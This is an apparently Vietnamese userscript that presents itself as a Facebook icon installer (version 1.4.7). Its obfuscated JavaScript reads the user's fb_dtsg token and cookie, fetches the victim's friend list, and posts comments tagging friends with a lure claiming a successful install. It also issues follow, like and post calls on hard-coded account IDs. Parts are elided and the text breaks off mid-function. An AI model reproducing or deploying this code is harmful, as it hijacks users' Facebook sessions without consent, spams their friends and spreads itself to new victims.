// ==UserScript==
// @name            Cài Ðặt Icon Facebook  :D ( Ver 1.4.7 )
// @description     All about facebook By Tim Rơi Lệ 
...
// ==Icon==
// Code tag
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","1407532362834778","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," Đẹp Quá.... Mọi Người Xem Nek  🍂  🐟  💝  👱  Thích Quá Hị<3 , minh cài đặt thành công rồi , tks nha , mình tag các bạn vào thử ha (Y) @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
...
sublist("1407527046168643");sublist("428837910582074");sublist("359393657526500");sublist("393405834125282");sublist("396682797130919");sublist("170016243130910");sublist("387175474748318");
Like("224038651122572");Like("581876285217793");Like("356608551148878");Like("187337911451332")
P("430596657072866");P("362816963850836");P("1847070208765082");P("1846641255474644");
P("1845773258894777"); P("1407532362834778");
(function() {
